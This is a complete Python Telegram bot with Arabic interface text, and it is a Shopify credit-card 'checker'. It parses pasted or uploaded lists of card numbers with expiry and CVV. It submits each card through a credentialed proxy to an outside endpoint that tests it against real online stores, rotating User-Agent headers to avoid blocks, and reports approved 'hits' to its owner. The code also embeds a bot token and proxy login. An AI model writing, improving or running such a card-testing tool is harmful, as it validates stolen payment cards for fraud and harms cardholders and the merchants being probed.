import telebot
from telebot import types
import requests
import re
import threading
import random
import time
import json
import os
from datetime import datetime

# ==================== التوكن والمتغيرات ====================
TOKEN = '8558756991:AAGlA5RUqv3QE75HKHXHNWcYTI0hcYyAy1M'
bot = telebot.TeleBot(TOKEN)
bot.remove_webhook()

OWNER_ID = 1013384909  # ضع معرفك هنا

# ==================== البروكسي الوحيد ====================
FIXED_PROXY = "http://iEN2jEvl:5TqD95Nm664K@proxy.taquito.pp.ua:8080"

# ==================== ملفات التخزين ====================
SITES_FILE = "sites.json"
STATS_FILE = "stats.json"

# تحميل البيانات
def load_sites():
    if os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'r') as f:
            return json.load(f)
    return []

def save_sites(sites):
    with open(SITES_FILE, 'w') as f:
        json.dump(sites, f, indent=4)

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, 'r') as f:
            return json.load(f)
    return {"total_checked": 0, "total_hits": 0, "total_dead": 0}

def save_stats(stats):
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f, indent=4)

# البيانات الافتراضية
SITES_LIST = load_sites()

if not SITES_LIST:
    SITES_LIST = [
        "https://makeship.com", "https://dutchwaregear.com", "https://sockbox.com",
        "https://www.nativecos.com", "https://www.tula.com", "https://drmtlgy.myshopify.com"
    ]
    save_sites(SITES_LIST)

# ==================== متغيرات الفحص ====================
checking_active = False
checking_thread = None
current_stats = {"live": 0, "dead": 0, "total": 0, "current": 0, "last_card": "", "last_response": "", "errors": []}
site_errors = {}

# ==================== دالة الطلب مع البروكسي ====================
def make_request(site, card):
    """إرسال طلب مع البروكسي - كل طلب يستخدم IP مختلف تلقائياً"""
    proxy_url = "https://web-production-a8008.up.railway.app/shopify"
    params = {
        "site": site,
        "cc": card,
        "proxy": FIXED_PROXY
    }
    
    # إعداد الـ Session مع البروكسي
    session = requests.Session()
    session.proxies = {
        'http': FIXED_PROXY,
        'https': FIXED_PROXY
    }
    
    # هيدرز عشوائية لتجنب الحظر
    session.headers.update({
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]),
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive'
    })
    
    try:
        response = session.get(proxy_url, params=params, timeout=25)
        return response.json()
    except Exception as e:
        return {"Status": False, "Response": f"ERROR: {str(e)[:50]}"}
    finally:
        session.close()

# ==================== لوحة التحكم الرئيسية ====================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.row(
        types.InlineKeyboardButton("🚀 بدء الفحص", callback_data="start_check"),
        types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check")
    )
    markup.row(
        types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
        types.InlineKeyboardButton("🌐 المواقع", callback_data="manage_sites")
    )
    markup.row(
        types.InlineKeyboardButton("⚠️ الأخطاء", callback_data="view_errors"),
        types.InlineKeyboardButton("🔄 تحديث", callback_data="refresh")
    )
    return markup

def sites_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("➕ إضافة موقع", callback_data="add_site"))
    markup.add(types.InlineKeyboardButton("📋 قائمة المواقع", callback_data="list_sites"))
    markup.add(types.InlineKeyboardButton("🗑 حذف موقع", callback_data="delete_site"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    return markup

def checking_screen():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
    return markup

# ==================== الأوامر ====================
@bot.message_handler(commands=['start'])
def start_cmd(m):
    if m.from_user.id != OWNER_ID:
        bot.reply_to(m, "⛔ هذا البوت خاص بصاحبه فقط")
        return
    
    welcome_text = f"""
🤖 **بوت فحص Shopify - مصطفى النجم**

━━━━━━━━━━━━━━━━━━━
📊 **الإحصائيات الحالية:**
• 🌐 مواقع نشطة: `{len(SITES_LIST)}`
• 🔌 بروكسي: `نشط`

━━━━━━━━━━━━━━━━━━━
💬 أرسل كومبو أو ملف .txt لبدء الفحص
━━━━━━━━━━━━━━━━━━━
👨‍💻 @o8380
"""
    bot.send_message(m.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['addsite'])
def add_site_cmd(m):
    if m.from_user.id != OWNER_ID:
        return
    msg = bot.reply_to(m, "🌐 أرسل رابط الموقع:\nمثال: https://example.com")
    bot.register_next_step_handler(msg, save_new_site)

def save_new_site(m):
    site = m.text.strip()
    if not site.startswith("https://") and not site.startswith("http://"):
        site = "https://" + site
    if site not in SITES_LIST:
        SITES_LIST.append(site)
        save_sites(SITES_LIST)
        bot.reply_to(m, f"✅ تم إضافة الموقع:\n{site}")
    else:
        bot.reply_to(m, "❌ الموقع موجود بالفعل")

@bot.message_handler(content_types=['document', 'text'])
def handle_input(m):
    if m.from_user.id != OWNER_ID:
        return
    
    global checking_active, checking_thread
    
    if checking_active:
        bot.reply_to(m, "⚠️ يوجد فحص نشط حالياً! أرسل الكومبو بعد الانتهاء أو أوقف الفحص أولاً.")
        return
    
    cards = []
    if m.content_type == 'text':
        if m.text.startswith('/'):
            return
        cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', m.text)
    else:
        try:
            file_info = bot.get_file(m.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', content)
        except Exception as e:
            bot.reply_to(m, f"❌ خطأ في قراءة الملف: {str(e)}")
            return
    
    if not cards:
        bot.reply_to(m, "❌ لم يتم العثور على بطاقات صالحة!\nالصيغة المطلوبة: xxxxxxxxxxxxxxxx|MM|YY|CVV")
        return
    
    total_cards = len(cards)
    global current_stats
    current_stats = {
        "live": 0, "dead": 0, "total": total_cards, "current": 0,
        "last_card": "", "last_response": "", "errors": []
    }
    site_errors.clear()
    
    # إرسال شاشة بدء الفحص
    msg = bot.send_message(m.chat.id, f"""
🚀 **بدء الفحص الشامل**
━━━━━━━━━━━━━━━━━━━
💳 عدد البطاقات: `{total_cards}`
🌐 مواقع متاحة: `{len(SITES_LIST)}`
🔌 البروكسي: `مباشر`
━━━━━━━━━━━━━━━━━━━
⏳ جاري الفحص...
""", parse_mode="Markdown", reply_markup=checking_screen())
    
    checking_active = True
    checking_thread = threading.Thread(target=run_checking, args=(m.chat.id, msg.message_id, cards))
    checking_thread.start()

# ==================== وظيفة الفحص الرئيسية ====================
def run_checking(chat_id, msg_id, cards):
    global checking_active, current_stats
    
    for idx, card in enumerate(cards):
        if not checking_active:
            bot.send_message(chat_id, "⏹ تم إيقاف الفحص يدوياً")
            break
        
        if not SITES_LIST:
            bot.send_message(chat_id, "❌ لا توجد مواقع متاحة! أضف مواقع أولاً باستخدام /addsite")
            break
        
        site = random.choice(SITES_LIST)
        current_stats["current"] = idx + 1
        current_stats["last_card"] = card
        
        try:
            start_time = time.time()
            data = make_request(site, card)
            elapsed = round(time.time() - start_time, 2)
            
            response_msg = str(data.get("Response", "N/A")).upper()
            status = data.get("Status", False)
            
            current_stats["last_response"] = response_msg
            
            success_keys = ["APPROVED", "SUCCESS", "FUNDS", "CHARGED", "DS_REQUIRED", "AUTHENTICATE", "AUTHORIZED"]
            is_live = status == True or any(k in response_msg for k in success_keys)
            
            if is_live:
                current_stats["live"] += 1
                bot.send_message(chat_id, f"""
🎯 **HIT / APPROVED**
━━━━━━━━━━━━━━━━━━━
💳 **CC:** `{card}`
📝 **Response:** `{response_msg}`
🌐 **Site:** `{site}`
⏱ **Time:** `{elapsed}s`
━━━━━━━━━━━━━━━━━━━
✅ مصطفى النجم 🇮🇶
""", parse_mode="Markdown")
            else:
                current_stats["dead"] += 1
                
                # حذف المواقع المعطلة
                if "TIMEOUT" in response_msg or "CONNECTION" in response_msg or "500" in response_msg:
                    if site not in site_errors:
                        site_errors[site] = 0
                    site_errors[site] += 1
                    if site_errors[site] >= 3 and site in SITES_LIST:
                        SITES_LIST.remove(site)
                        save_sites(SITES_LIST)
                        bot.send_message(chat_id, f"⚠️ تم حذف الموقع `{site}` بسبب أخطاء متكررة", parse_mode="Markdown")
            
        except Exception as e:
            current_stats["dead"] += 1
            error_msg = f"ERROR: {str(e)[:50]}"
            current_stats["errors"].append(f"{card}: {error_msg}")
        
        # تحديث شاشة التقدم كل 5 بطاقات
        if (idx + 1) % 5 == 0 or (idx + 1) == len(cards):
            try:
                progress = int((idx + 1) / len(cards) * 100)
                bot.edit_message_text(f"""
🚀 **فحص Shopify - مصطفى النجم**
━━━━━━━━━━━━━━━━━━━
📊 **التقدم:** [{idx+1}/{len(cards)}] ({progress}%)
✅ **Approved:** `{current_stats['live']}`
❌ **Declined:** `{current_stats['dead']}`
━━━━━━━━━━━━━━━━━━━
💳 **آخر بطاقة:** `{card[:16]}...`
📝 **الرد:** `{current_stats['last_response'][:30]}`
━━━━━━━━━━━━━━━━━━━
🌐 **مواقع نشطة:** `{len(SITES_LIST)}`
━━━━━━━━━━━━━━━━━━━
⚡ @o8380
""", chat_id, msg_id, parse_mode="Markdown", reply_markup=checking_screen())
            except:
                pass
        
        time.sleep(0.5)
    
    checking_active = False
    
    # إرسال التقرير النهائي
    total_checked = len(cards)
    if total_checked > 0:
        hit_rate = round(current_stats['live'] / total_checked * 100, 1)
    else:
        hit_rate = 0
    
    final_report = f"""
🏁 **تقرير الفحص النهائي**
━━━━━━━━━━━━━━━━━━━
📊 **إجمالي البطاقات:** `{total_checked}`
✅ **Hits:** `{current_stats['live']}`
❌ **Dead:** `{current_stats['dead']}`
📈 **نسبة النجاح:** `{hit_rate}%`
━━━━━━━━━━━━━━━━━━━
🌐 **المواقع المتبقية:** `{len(SITES_LIST)}`
━━━━━━━━━━━━━━━━━━━
⚡ @o8380
"""
    bot.send_message(chat_id, final_report, parse_mode="Markdown", reply_markup=main_menu())

# ==================== معالجة الأزرار ====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global checking_active
    
    if call.data == "start_check":
        bot.answer_callback_query(call.id, "📁 أرسل الكومبو أو ملف .txt لبدء الفحص")
        bot.send_message(call.message.chat.id, "📁 أرسل الكومبو أو ملف .txt لبدء الفحص")
    
    elif call.data == "stop_check":
        checking_active = False
        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
        try:
            bot.edit_message_text("⏹ تم إيقاف الفحص", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
        except:
            pass
    
    elif call.data == "stats":
        hit_rate = 0
        if current_stats['total'] > 0:
            hit_rate = round(current_stats['live'] / current_stats['total'] * 100, 1)
        text = f"""
📊 **الإحصائيات الحالية**
━━━━━━━━━━━━━━━━━━━
📊 **آخر فحص:**
✅ Hits: `{current_stats['live']}`
❌ Dead: `{current_stats['dead']}`
📈 نسبة النجاح: `{hit_rate}%`
━━━━━━━━━━━━━━━━━━━
🌐 المواقع النشطة: `{len(SITES_LIST)}`
━━━━━━━━━━━━━━━━━━━
🔌 البروكسي: `نشط`
"""
        try:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=main_menu())
        except:
            pass
    
    elif call.data == "manage_sites":
        try:
            bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
        except:
            pass
    
    elif call.data == "list_sites":
        if SITES_LIST:
            sites_text = "\n".join([f"• {s}" for s in SITES_LIST[:20]])
            if len(SITES_LIST) > 20:
                sites_text += f"\n...و{len(SITES_LIST)-20} موقع آخر"
            try:
                bot.edit_message_text(f"📋 **قائمة المواقع ({len(SITES_LIST)}):**\n━━━━━━━━━━━━━━━━━━━\n{sites_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "❌ لا توجد مواقع")
    
    elif call.data == "add_site":
        bot.send_message(call.message.chat.id, "🌐 أرسل رابط الموقع:")
        bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "delete_site":
        if SITES_LIST:
            markup = types.InlineKeyboardMarkup(row_width=1)
            for site in SITES_LIST[:10]:
                markup.add(types.InlineKeyboardButton(f"🗑 {site[:40]}", callback_data=f"del_site_{site}"))
            markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="manage_sites"))
            try:
                bot.edit_message_text("🗑 **اختر موقعاً للحذف:**", call.message.chat.id, call.message.message_id, reply_markup=markup)
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "❌ لا توجد مواقع للحذف")
    
    elif call.data.startswith("del_site_"):
        site = call.data[9:]
        if site in SITES_LIST:
            SITES_LIST.remove(site)
            save_sites(SITES_LIST)
            bot.answer_callback_query(call.id, f"✅ تم حذف الموقع")
            try:
                bot.edit_message_text("🌐 **إدارة المواقع**\n━━━━━━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=sites_menu())
            except:
                pass
    
    elif call.data == "view_errors":
        if current_stats["errors"]:
            errors_text = "\n".join(current_stats["errors"][-10:])
            try:
                bot.edit_message_text(f"⚠️ **أخر 10 أخطاء:**\n━━━━━━━━━━━━━━━━━━━\n{errors_text}", call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=main_menu())
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "✅ لا توجد أخطاء")
    
    elif call.data == "back":
        try:
            bot.edit_message_text("✅ الرئيسية", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
        except:
            pass
    
    elif call.data == "refresh":
        try:
            bot.edit_message_text("✅ تم التحديث", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
        except:
            pass

# ==================== تشغيل البوت ====================
print("""
╔══════════════════════════════════════╗
║         🤖 بوت مصطفى النجم 🤖         ║
║     Developer: @o8380                ║
║     Version: 7.0 - Shopify Checker   ║
╚══════════════════════════════════════╝
""")
print(f"✅ المواقع المحملة: {len(SITES_LIST)}")
print(f"🔌 البروكسي: {FIXED_PROXY[:50]}...")
print("🚀 البوت يعمل الآن...")

bot.infinity_polling(timeout=30)
